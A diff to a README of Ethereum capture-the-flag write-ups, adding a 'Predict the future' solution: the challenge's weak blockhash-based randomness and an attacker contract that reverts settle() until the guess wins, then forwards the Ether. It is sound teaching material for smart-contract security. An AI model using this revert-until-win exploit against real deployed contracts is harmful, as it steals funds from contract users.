@@ -13,6 +13,7 @@ Most of the contracts were rewritten slightly so they still compile with newer s
     -   [Guess the secret number](#guess-the-secret-number)
     -   [Guess the random number](#guess-the-random-number)
     -   [Guess the new number](#guess-the-new-number)
+    -   [Predict the future](#predict-the-future)
 
 ## Lotteries
 
@@ -65,7 +66,7 @@ for (uint8 i = 0; i <= type(uint8).max; i++) {
 
 ### Guess the random number
 
-In this case the answer is generated "randomly" and stored "internally" in the contract (default visibility of state variables is 'internal'):
+In this case the answer is generated "randomly" and stored "internally" in the contract (default visibility of state variables is `internal`):
 
 ```solidity
 constructor() payable {
@@ -143,3 +144,63 @@ receive() external payable {}
 And don't forget to transfer the Ether from the attacker contract to your address (or create a withdraw function only callable by you) 💸
 
 [Test](./test/lotteries/TestGuessTheNewNumberChallenge.t.sol)
+
+### Predict the future
+
+The guess answer now has to be set beforehand, and then settled on a new tx, as it requires to be on a future block
+
+```solidity
+function lockInGuess(uint8 n) public payable {
+  guess = n;
+  settlementBlockNumber = block.number + 1;
+}
+
+function settle() public {
+  require(block.number > settlementBlockNumber);
+  uint8 answer = uint8(
+            uint256(
+                keccak256(
+                    abi.encodePacked(
+                        blockhash(block.number - 1),
+                        block.timestamp
+                    )
+                )
+            )
+        ) % 10;
+}
+```
+
+The "random" answer can _only_ be a number between `0-9` because of the `% 10`.
+
+With this in mind we can exploit it:
+
+1. Create an attacker contract and call `lockInGuess()` with any number between `0-9` through the contract
+
+```solidity
+function lockNumber(uint8 _number) public payable {
+        require(msg.value == 1 ether);
+        require(
+            _number >= 0 && _number <= 9,
+            "Number must be in the 0-9 range"
+        );
+
+        challenge.lockInGuess{value: 1 ether}(_number);
+    }
+```
+
+2. Wait 2 blocks
+3. Call `settle()` through the attacker contract and revert in case challenge wasn't solved
+
+```solidity
+function solveChallenge() public {
+        challenge.settle();
+        // Reverts in case guess != answer
+        require(challenge.isComplete(), "Try again");
+        (bool success, ) = owner.call{value: address(this).balance}("");
+        require(success, "sending eth to owner failed");
+    }
+```
+
+Call `solveChallenge` in concecutive blocks until solved. This way we only pay when we know we will win.
+
+[Test](./test/lotteries/TestPredictTheFutureChallenge.t.sol)
